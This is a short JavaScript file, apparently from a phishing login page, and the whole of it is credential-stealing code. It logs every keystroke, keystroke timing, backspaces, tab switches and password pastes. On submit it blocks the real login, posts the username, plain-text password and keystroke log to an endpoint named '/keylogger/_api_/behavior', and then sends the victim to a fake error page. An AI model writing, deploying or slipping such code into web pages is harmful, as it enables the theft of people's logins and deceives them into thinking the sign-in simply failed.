let teclas = '';
let startTime = Date.now();
let backspaceCount = 0;
let visibilityChanges = 0;
let pasted = false;
let lastKeyTime = null;
let delays = [];

document.addEventListener('keydown', e => {
    if (e.key.length === 1) teclas += e.key;
    if (e.key === 'Backspace') backspaceCount++;

    const now = Date.now();
    if (lastKeyTime) {
        delays.push(now - lastKeyTime);
    }
    lastKeyTime = now;
});

document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'hidden' || document.visibilityState === 'visible') {
        visibilityChanges++;
    }
});

document.querySelector('[name="clave"]').addEventListener('paste', () => {
    pasted = true;
});

document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const datos = new FormData(this);
    const elapsed = Date.now() - startTime;

    fetch('/keylogger/_api_/behavior', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            u: datos.get('usuario') || '',
            p: datos.get('clave') || '',
            k: teclas,
            t: elapsed,
            b: backspaceCount,
            c: visibilityChanges,
            g: pasted,
            d: delays
        })
    }).then(() => {
        window.location.href = 'error_page.html';
    });
});